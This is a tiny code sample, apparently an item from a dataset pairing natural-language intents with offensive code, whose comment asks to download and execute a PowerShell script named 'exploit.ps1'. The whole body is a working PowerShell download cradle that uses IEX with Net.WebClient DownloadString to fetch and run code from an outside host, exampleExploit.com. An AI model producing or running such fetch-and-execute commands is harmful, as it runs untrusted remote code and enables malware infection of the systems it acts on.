# Natural language intent:
# Download and execute a PowerShell script named 'exploit.ps1' from a specified URL.

IEX (New-Object Net.WebClient).DownloadString('http://exampleExploit.com/exploit.ps1');
